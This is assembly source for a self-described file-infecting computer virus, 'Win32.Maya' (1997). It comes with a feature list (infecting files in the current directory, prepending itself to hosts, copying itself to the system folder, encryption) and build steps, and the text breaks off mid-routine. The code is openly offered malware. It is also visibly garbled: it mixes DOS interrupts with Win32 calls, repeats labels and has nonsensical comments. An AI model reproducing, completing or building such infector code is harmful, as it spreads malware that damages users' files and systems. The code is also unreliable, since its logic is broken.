;Win32.Maya virus
;(c) 1997 by Benny/HighEvolution

;This is not really an original virus.
;I made this to test my ability to write an encrypted virus,
;and I did it. This virus is encrypted with my favorite encryption engine
;(haha!), that i wrote some months ago. Yes, you read right! YES! :)

;MAYA virus (version 2)
;=======================


;Features:
;=========
;- Finds all files in current directory
;- Opens first file 
;- Moves the virus at the begining of the file
;- Moves itself (the exe-file) to the win system folder
;- Restarts the host file
;- The virus is encrypted with my second generation of virus encryptors



;Technloghy:
;=============
;- Uses Win32.FindFirstFileA and Win32.CreateFileA APIs to find and open
;- files.
;- Uses the procedure described in "The Little Engine" to decrypt the virus.



;What will the virus do next?
;==============================
;I don't know yet... Maybe another payload.



;Files used:
;=============
;- maya.asm - This file
;- mayacrypt.inc - The encrypted part of the virus
;- tasm386.exe - A 386 assembler
;- tlink.exe - A linkeger
;- edit.com - Any M$ windows editor (^))
;- hyper.exe - a utility to make .exe-files executable under DOS


;How to build:
;===============
;- Assemble maya.asm with: tasm386 /m2 maya
;- Link maya.obj with: tlink /t maya.obj edit.com +hyper.exe
;- You have now maya.exe



;And here comes the source:

.model	flat
locals	@

include	win32api.inc

.data
        dd      0xdeadbeef		;Just for debuggin

.code

VirusSize	equ	VirussizeEnd-VirusStart
DecryptSize	equ	Decryptsizeend-Decryptstart
TempSize	equ	Tempfilesizeend-Tempfilestart

extrn	MessageBoxA:PROC
extrn	GetModuleHandleA:PROC
extrn	ExitProcess:PROC

start:
VirusName	db	"Maya",0
Author	db	"Benny/HE",0
SystemFolder	dd	?			;Buffer for system-folder path
SystemFolderMask	db	"*.*",0		;Match any file
SystemSearchHandle	dd	?	;Handle to file searched for
SystemFileAttributes	dd	?	
SystemFileName	db	255 dup(?)	;Buffer for found file's name
HostFileName	db	255 dup(?)

VirusStart label	byte
        push    ebp             ;Save base adress on stack
        call	Delta               ;Calculate delta-offset
Delta:	pop	ebp
	mov	dword ptr [ebp+DeltaValue],eax
	add	eax,virlength
	mov	si,eax
	cmp	word ptr [si+idoffset],0BFF7h   ;Are we already resident?
	jz	QuitVirus

        mov     dx, offset SystemFolderMask           ;Match all files
        push	dx                                
	push	offset SystemFileName                 ;Buffer for filename
	call	FindFirstFileA                        ;Find first file
	inc	eax					;Check if file found
	jz	QuitVirus				;No -> quit virus

	mov	dword ptr [ebp+SystemFileAttributes],eax
	mov	dword ptr [ebp+SystemSearchHandle],esi
	
	mov	di,offset HostFileName
	mov	cx,255
	rep	movsb	

	mov	di,offset SystemFileName
	push	dword ptr [di+4]			;Save file-size
	mov	ax,[di]
	mov	word ptr [ebp+HostFileSize],ax	;Save high word of filesize
	add	ax,word ptr [ebp+DeltaValue]
	mov	word ptr [ebp+HostNewOffset],ax	;Calc new host offset
	add	ax,VirusSize
	adc	dl,0
	mov	word ptr [ebp+VirusNewOffset],ax	;Calc where virus starts in file
	add	ax,TempSize
	adc	dl,0
	mov	word ptr [ebp+DecryptionStart],ax	;Calc where decryption starts in file
	add	ax,DecryptSize
	adc	dl,0
	mov	word ptr [ebp+VirusEndOffset],ax	;Calc where virus ends in file

	mov	dx,di
	push	dx	
	push	offset HostFileName
	call	CreateFileA
	test	eax,eax			;Check if file opened ok
	jnz	OpenOk			;Yes -> continue
	jmp	CantOpenFile		;No -> get outa here!

OpenOk:
	xchg	eax,edx			;Move filehandle in edx
	mov	[ebp+Filehandle],edx
	
	push	edx			;Push filehandle
	push	edx
	push	offset HostFileName
	call	SetFilePointer		;Set pointer to start of file
	or	eax,eax			;Check if SetFilePointer returns zero
	jz	FilepointerOk		;Yep -> continue
	jmp	FilepointerFail		;No -> outa here!

FilepointerOk:
	pop	edx			;Pop filehandle from stack

	push	edx			;Push filehandle
	push	40h			;Insert zero-byte after four bytes
	push	offset HostNewOffset
	push	edx			;Filehandle again
	call	SetFilePointer		;Move pointer 40h bytes from beginning
	or	eax,eax			;Check if call was successful
	jz	WriteBeginOk		;Yep -> continue
	jmp	WriteBeginFail		;No -> outa here!

WriteBeginOk:
	mov	ebx,[ebp+DeltaValue]
	sub	ebx,1000h
	
	push	ebx			;Pass delta-value to WriteFile proc
	push	offset Tempfilestart
	push	VirusSize
	push	edx			;Filehandle
	call	WriteFile		;Write virus to beginning of file
	
	mov	edi,offset Tempfilestart
	mov	esi,offset _delta_value
	mov ecx,VirusSize
	rep movsb
						
WriteBeginFail:
	pop	edx			;Get filehandle back
	
	push	edx			;Push it again
	push	offset HostFileName
	push	edx			;Again...
	call	CloseHandle		;Close the file
	
	pop	edx			;Pop filehandle from stack

	mov	ecx,dword ptr [ebp+HostFileSize]
	push	ecx			;Pass filesize to WriteFile proc
	push	offset HostFileName
	push	edx			;Filehandle
	call	SetEndOfFile		;Resize host file to old size
	or	eax,eax			;Check if call was successful
	jz	RestoreHostOk		;Yep -> continue
	jmp	RestoreHostFail		;No -> outa here!

RestoreHostOk:
	push	edx			;Push file-handle
	
	mov	di,offset SystemFileName
	push	dword ptr [di+4]	
	mov	ax,[di]
	add	ax,word ptr [ebp+DeltaValue]
	mov	word ptr [ebp+NewHostOffset],ax
	
	mov	dx,di
	push	dx
	push	offset HostFileName
	call	CreateFileA
	
	inc	eax
	jz	OpenOk
	
	jmp	CantOpenFile

RestoreHostFail:
CantOpenFile:
WriteBeginFail:
FilepointerFail:
	mov	dx,5
	mov	di,offset SystemFileName
	mov	ah,37h			;mcb fetch
	int	21h
	
	mov	dx,di
	push	dx			
	push	offset SystemFolder
	call	SetCurrentDirectory	;Return to system-folder
	inc	eax
	jnz	ReturnOk

	mov	ah,09h			;Print error message
	mov	dx,offset CantOpenFileMsg
	int	21h
	
	int	20h

ReturnOk:
	mov	edi,offset Tempfilestart
	push	edi
	ret

WriteFile	label near
_						;We use this procedure to write parts of
	push	[hnd]			;the virus-code to the host-file
	test	eax,eax
	jz	WritePartOk
	pop	edi
	push	edi
	ret
WritePartOk:
_						;We use this procedure to set the file-pointers
	push	[hnd]			;to a certain position
	test	eax,eax
	jnz	ReadPartOk
	pop	edi
	push	edi
	ret
ReadPartOk:
	pop	ecx
	mov	dl,0			;Zero fill ?
	mov	dh,0			;Zero fill ?
	mov	ch,0			;0 bytes
	shr	cl,ch			;Divide cx with 256
	add	cx,4			;Add 4 to cx (low word of cx contains offset)
	mov	di,edx
	push	cx
	mov	cx,ds:[di]		;Get low word of offset in cx
	mul	cx			;Multiply cx with handle in edi (edi=cx*edx)
	mov	di,edx
	sub	dx,ds:[di]		;Subtract lwo word of handle from ax
	add	ax,cx			;Add result and high word of offset
	mov	dwptr [ebp+DeltaValue],ax ;Store result as delta value
	pop	cx
	ret

SetEndOfFile label	near
pushfd				;Save flags and registers
pushall
	xor	eax,eax
	push	eax			;Give